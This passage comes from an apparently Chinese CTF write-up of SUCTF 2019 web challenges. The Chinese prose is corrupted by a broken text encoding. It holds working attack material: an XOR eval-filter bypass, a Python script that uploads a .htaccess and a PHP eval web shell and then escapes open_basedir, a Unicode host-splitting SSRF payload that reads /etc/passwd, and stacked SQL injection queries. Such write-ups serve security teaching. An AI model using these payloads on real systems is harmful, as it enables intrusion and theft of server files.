$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æºç ä¹‹åæ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼Œ<code>get_the_flag</code> å‡½æ•°éƒ¨åˆ†çš„ä¸Šä¼ æ¼æ´å’Œä¸Šé¢˜ç›¸ç±»ä¼¼ï¼Œä½†æ˜¯ä¸åŒçš„æ˜¯è¿™é‡Œæ˜¯<code>apache</code>ç¯å¢ƒï¼Œæ‰€ä»¥è¦ä¸Šä¼ çš„æ˜¯<code>.htaccess</code>æ–‡ä»¶æ¥æ„é€ è§£æã€‚</p><p>å…³é”®çš„æ˜¯ç¬¬ä¸€éƒ¨åˆ†ï¼Œå¦‚ä½•æ¥è®©<code>eval</code> å‡½æ•°è§¦å‘<code>get_the_flag</code> å‡½æ•°ï¼Œé¦–å…ˆåˆ¤æ–­æ­£åˆ™è¿‡æ»¤äº†é‚£äº›asciiå­—ç¬¦ï¼Œå†™ä¸€ä¸ªè„šæœ¬åˆ¤æ–­ä¸€ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$unfilter_str = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($ascii = <span class="number">0</span>; $ascii &lt; <span class="number">256</span>; $ascii++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($ascii))) &#123;</span><br><span class="line">$unfilter_str[] = urlencode(chr($ascii));</span><br><span class="line">&#125;</span><br><span class="line">print_r(<span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $unfilter_str) . <span class="string">'\''</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¯ä»¥å¾—åˆ°æœ‰å¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;%21&apos;,&apos;%23&apos;,&apos;%24&apos;,&apos;%25&apos;,&apos;%28&apos;,&apos;%29&apos;,&apos;%2A&apos;,&apos;%2B&apos;,&apos;-&apos;,&apos;%2F&apos;,&apos;%3A&apos;,&apos;%3B&apos;,&apos;%3C&apos;,&apos;%3E&apos;,&apos;%3F&apos;,&apos;%40&apos;,&apos;%5C&apos;,&apos;%5D&apos;,&apos;%5E&apos;,&apos;%7B&apos;,&apos;%7D&apos;,&apos;%80&apos;,&apos;%81&apos;,&apos;%82&apos;,&apos;%83&apos;,&apos;%84&apos;,&apos;%85&apos;,&apos;%86&apos;,&apos;%87&apos;,&apos;%88&apos;,&apos;%89&apos;,&apos;%8A&apos;,&apos;%8B&apos;,&apos;%8C&apos;,&apos;%8D&apos;,&apos;%8E&apos;,&apos;%8F&apos;,&apos;%90&apos;,&apos;%91&apos;,&apos;%92&apos;,&apos;%93&apos;,&apos;%94&apos;,&apos;%95&apos;,&apos;%96&apos;,&apos;%97&apos;,&apos;%98&apos;,&apos;%99&apos;,&apos;%9A&apos;,&apos;%9B&apos;,&apos;%9C&apos;,&apos;%9D&apos;,&apos;%9E&apos;,&apos;%9F&apos;,&apos;%A0&apos;,&apos;%A1&apos;,&apos;%A2&apos;,&apos;%A3&apos;,&apos;%A4&apos;,&apos;%A5&apos;,&apos;%A6&apos;,&apos;%A7&apos;,&apos;%A8&apos;,&apos;%A9&apos;,&apos;%AA&apos;,&apos;%AB&apos;,&apos;%AC&apos;,&apos;%AD&apos;,&apos;%AE&apos;,&apos;%AF&apos;,&apos;%B0&apos;,&apos;%B1&apos;,&apos;%B2&apos;,&apos;%B3&apos;,&apos;%B4&apos;,&apos;%B5&apos;,&apos;%B6&apos;,&apos;%B7&apos;,&apos;%B8&apos;,&apos;%B9&apos;,&apos;%BA&apos;,&apos;%BB&apos;,&apos;%BC&apos;,&apos;%BD&apos;,&apos;%BE&apos;,&apos;%BF&apos;,&apos;%C0&apos;,&apos;%C1&apos;,&apos;%C2&apos;,&apos;%C3&apos;,&apos;%C4&apos;,&apos;%C5&apos;,&apos;%C6&apos;,&apos;%C7&apos;,&apos;%C8&apos;,&apos;%C9&apos;,&apos;%CA&apos;,&apos;%CB&apos;,&apos;%CC&apos;,&apos;%CD&apos;,&apos;%CE&apos;,&apos;%CF&apos;,&apos;%D0&apos;,&apos;%D1&apos;,&apos;%D2&apos;,&apos;%D3&apos;,&apos;%D4&apos;,&apos;%D5&apos;,&apos;%D6&apos;,&apos;%D7&apos;,&apos;%D8&apos;,&apos;%D9&apos;,&apos;%DA&apos;,&apos;%DB&apos;,&apos;%DC&apos;,&apos;%DD&apos;,&apos;%DE&apos;,&apos;%DF&apos;,&apos;%E0&apos;,&apos;%E1&apos;,&apos;%E2&apos;,&apos;%E3&apos;,&apos;%E4&apos;,&apos;%E5&apos;,&apos;%E6&apos;,&apos;%E7&apos;,&apos;%E8&apos;,&apos;%E9&apos;,&apos;%EA&apos;,&apos;%EB&apos;,&apos;%EC&apos;,&apos;%ED&apos;,&apos;%EE&apos;,&apos;%EF&apos;,&apos;%F0&apos;,&apos;%F1&apos;,&apos;%F2&apos;,&apos;%F3&apos;,&apos;%F4&apos;,&apos;%F5&apos;,&apos;%F6&apos;,&apos;%F7&apos;,&apos;%F8&apos;,&apos;%F9&apos;,&apos;%FA&apos;,&apos;%FB&apos;,&apos;%FC&apos;,&apos;%FD&apos;,&apos;%FE&apos;,&apos;%FF&apos;]</span><br></pre></td></tr></table></figure></p><p>é‚£ä¹ˆä¹‹ååªè¦ä½¿ç”¨æ—¢æœ‰çš„è§„åˆ™æ¨¡å¼è¿›è¡Œfuzzå³å¯ï¼ˆéšåä¼šå†™ä¸“é—¨çš„æ–‡ç« æ¥ä»‹ç»webfuzzï¼‰</p><p>å› ä¸ºè¿˜æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥å¦‚æœfuzzå‡º<code>get_the_flag</code>çš„è¯ï¼Œå¯èƒ½é•¿åº¦ä¼šè¶…ï¼Œæ‰€ä»¥è€ƒè™‘ç‡fuzzå‡º<code>$_GET[z]</code>ï¼Œç„¶åè®©phpè§£æ<code>${$_GET[z]}</code>æ¥è¾¾åˆ°è°ƒç”¨å¯¹åº”å‡½æ•°çš„ç›®çš„ã€‚</p><p>è¿™é‡Œfuzzå­—ç¬¦ä¹‹é—´çš„å¼‚æˆ–ï¼Œæœ€ç»ˆå¾—åˆ°å¦‚ä¸‹ç»“æœ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">// fuzz_api.php</span></span><br><span class="line">$_=$_GET[<span class="string">'a'</span>]^$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="comment">// $_ = '%fe%fe%fe%fe^%a1%b9%bb%aa';</span></span><br><span class="line"><span class="keyword">if</span>($_ == <span class="string">'_GET'</span>)print_r(<span class="string">'true'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>å› ä¸ºå¯è§å­—ç¬¦éƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œæˆ‘ä»¬è¿˜å¾—è¦ä¸€ä¸ªå­—ç¬¦æ¥ä½œä¸ºå‚æ•°ï¼ŒåŒæ—¶è¦è€ƒè™‘bypass<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br></pre></td></tr></table></figure></p><p>æ‰€ä»¥ç®€å•çš„åšæ³•å°±æ˜¯æŠŠä¸Šé¢çš„å¯ç”¨å­—ç¬¦ä¸²å†ç»™fuzzä¸€éï¼Œæœ€ç»ˆå¾—åˆ°å¦‚ä¸‹payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();</span><br></pre></td></tr></table></figure></p><p>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥å†™è„šæœ¬æ¥ä¸€é”®getshelläº†<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.111.59.243:9001/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .zzzz</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">shell = <span class="string">b"\x00\x00\x8a\x39\x8a\x39"</span>+<span class="string">b"00"</span>+ base64.b64encode(<span class="string">b"&lt;?php eval($_GET['c']);?&gt;"</span>)</span><br><span class="line"><span class="comment"># shell =  b"\x00\x00\x8a\x39\x8a\x39"+b"00" + "&lt;script language='php'&gt;eval($_REQUEST[c]);&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;"http":"http://127.0.0.1:8080"&#125;</span></span><br><span class="line">print(<span class="string">"upload .htaccess"</span>)</span><br><span class="line">r = requests.post(url=url,files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(r.text) </span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"upload shell.zzzz"</span>)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'shell.zzzz'</span>,shell,<span class="string">'application/octet-stream'</span>))]</span><br><span class="line">r = requests.post(url=url,files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = requests.get('http://47.111.59.243:9001/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz?c=system(%27ls%27);')</span></span><br><span class="line"><span class="comment"># r = requests.get("http://47.111.59.243:9001/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz?c=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));")</span></span><br><span class="line">r = requests.get(<span class="string">"http://47.111.59.243:9001/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz?c=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g'));"</span>)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure></p><p>æœ€ç»ˆå¾—åˆ°flag<br><img src="https://i.loli.net/2019/09/05/6hXeyQgimSRdZsj.png" alt="EA4BD431-2FDC-48FC-8B9F-52C77D727628.png"></p><h2 id="0x03-Pythonginx"><a href="#0x03-Pythonginx" class="headerlink" title="0x03 Pythonginx"></a>0x03 Pythonginx</h2><h4 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p><a href="http://47.111.59.243:9000/" target="_blank" rel="noopener">http://47.111.59.243:9000/</a></p><h4 id="é¢˜ç›®è§£ç­”-2"><a href="#é¢˜ç›®è§£ç­”-2" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>å³é”®ç›´æ¥çœ‹åˆ°é¢˜ç›®çš„æºä»£ç ï¼ˆå®Œå¥½æ ¼å¼ï¼‰<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 333"</span></span><br></pre></td></tr></table></figure></p><p>çœ‹åˆ°è¿™ä¸ªä»£ç ç«‹é©¬æƒ³åˆ°æœ€è¿‘blackhatå¤§ä¼šä¸Šå…¬å¸ƒçš„å‡ ä¸ªtrickï¼Œå…·ä½“é“¾æ¥å¦‚ä¸‹</p><p><a href="https://bugs.python.org/issue36742" target="_blank" rel="noopener">https://bugs.python.org/issue36742</a></p><p><a href="https://bugs.python.org/issue36216" target="_blank" rel="noopener">https://bugs.python.org/issue36216</a></p><p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p><p>ç½‘é¡µæºç çš„æ³¨é‡Šä¸Šä¹Ÿæœ‰æç¤º<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Do you know the nginx? --&gt;</span></span><br></pre></td></tr></table></figure></p><p>æ‰€ä»¥æˆ‘ä»¬ç»“åˆä¸Šé¢çš„ä¿¡æ¯ï¼Œæ¥æ„é€ payloadå¦‚ä¸‹:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file://suctf.c%E2%84%82/../../../etc/passwd</span><br></pre></td></tr></table></figure></p><p>æ­¤å¤„ç”¨äºæ„é€ cçš„å­—ç¬¦æ¥æº</p><p><a href="https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols" target="_blank" rel="noopener">https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols</a></p><p>ç»è¿‡ä¸€ç•ªfuzzï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­è¯»åˆ°flagçš„è·¯å¾„å’Œåç§°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file://suctf.c%E2%84%82/../../../usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri @app;</span><br><span class="line">    &#125;</span><br><span class="line">    location @app &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass unix:///tmp/uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">    location /static &#123;</span><br><span class="line">        alias /app/static;</span><br><span class="line">    &#125;</span><br><span class="line">    # location /flag &#123;</span><br><span class="line">    #     alias /usr/fffffflag;</span><br><span class="line">    # &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆè¯»åˆ°flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file://suctf.c%E2%84%82/../../../usr/fffffflag</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/09/05/M3W1296Pk87cBxh.png" alt="12C801C2-3D42-43C5-8A68-7F8A2613DDD8.png"></p><p>å¦‚æœä½ çš„å­—å…¸ä¸å¤Ÿç»™åŠ›ï¼Œfuzzä¸åˆ°çš„è¯ï¼Œä¸å¦¨è¯•è¯•è¿™ä¸ª</p><p><a href="https://github.com/zer0yu/Berserker/blob/master/webfuzz/fi/lfi.txt" target="_blank" rel="noopener">https://github.com/zer0yu/Berserker/blob/master/webfuzz/fi/lfi.txt</a></p><h2 id="0x04-easy-sql"><a href="#0x04-easy-sql" class="headerlink" title="0x04 easy_sql"></a>0x04 easy_sql</h2><h4 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p><a href="http://47.111.59.243:9061" target="_blank" rel="noopener">http://47.111.59.243:9061</a></p><h4 id="é¢˜ç›®è§£ç­”-3"><a href="#é¢˜ç›®è§£ç­”-3" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>æ˜¾ç¤ºéšä¾¿æµ‹äº†ä¸€ä¸‹ï¼Œå‘ç°ä¸€èˆ¬ä¼šæœ‰ä»¥ä¸‹å››ç§è¿”å›ç»“æœ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. query=1e100</span><br><span class="line"></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">2.query=0x730065006c0065006300740020004000400076006500%20%2e%2e%2e</span><br><span class="line"></span><br><span class="line">Too long.</span><br><span class="line"></span><br><span class="line">3.query=1)%20or%20benchmark(10000000,MD5(1))#</span><br><span class="line"></span><br><span class="line">Nonono.</span><br><span class="line"></span><br><span class="line">4.query=NULL</span><br><span class="line"></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; </span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°å­—ç¬¦é•¿åº¦æ˜¯æœ‰é™åˆ¶çš„ï¼Œè€Œä¸”è¿‡æ»¤äº†ä¸€äº›å…³é”®è¯</p><p>ä¹‹åfuzzæµ‹è¯•çš„è¿‡ç¨‹ä¸­å‘ç°æ˜¯å †å æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># æ˜¾ç¤ºæ•°æ®åº“</span><br><span class="line">query=1; show databases;</span><br><span class="line"># å›æ˜¾</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; information_schema</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; CTF</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; mysql</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; performance_schema</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; score_mbamission</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; score_minnesotaunited</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># å›æ˜¾è¡¨å</span><br><span class="line">query=1; show tables;</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; Flag</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># ä½†æ˜¯è¿‡æ»¤äº†from</span><br><span class="line">query=1; select * from Flag;</span><br><span class="line"># å›æ˜¾</span><br><span class="line">Nonono.</span><br><span class="line"># è¿™æ ·ä¹Ÿä¸è¡Œ</span><br><span class="line">query=1; SET @SQL=0x73656c656374202a2066726f6d20466c61673b;PREPARE pord</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€åè§£å†³æ–¹æ³•æ˜¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># ç›´æ¥è¾“å‡ºflag</span><br><span class="line">query=*,1</span><br><span class="line"># å›æ˜¾</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125;</span><br><span class="line">    [1] =&gt; 1</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>åˆ«é—®ï¼Œé—®å°±æ˜¯fuzz</p><p><a href="https://github.com/zer0yu/Berserker/blob/master/webfuzz/sqli/sql_fuzz.txt" target="_blank" rel="noopener">https://github.com/zer0yu/Berserker/blob/master/webfuzz/sqli/sql_fuzz.txt</a></p><h2 id="0x05-Upload-labs-2"><a href="#0x05-Upload-labs-2" class="headerlink" title="0x05 Upload labs 2"></a>0x05 Upload labs 2</h2><h4 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>å»çœ‹çœ‹ä½ è‡ªå·±åˆ°åº•ä¼ äº†ä¸ªå•¥ <a href="http://47.111.59.243:9025/" target="_blank" rel="noopener">http://47.111.59.243:9025/</a> äº¤flagæ—¶å»æ‰å¼•å·</p><h4 id="é¢˜ç›®è§£ç­”-4"><a href="#é¢˜ç›®è§£ç­”-4" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>é¢˜ç›®æœ‰é™„ä»¶ï¼Œæ‰€ä»¥æ˜¯ä¸€ä¸ªä»£ç å®¡è®¡é¢˜ç›®ï¼Œå…ˆçœ‹æœ€ç»ˆæ€ä¹ˆå¯ä»¥getflagï¼Œå‘ç°æœ‰å¯¹åº”çš„å‡½æ•°ï¼Œåœ¨<code>admin.php</code>ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    getFlag(<span 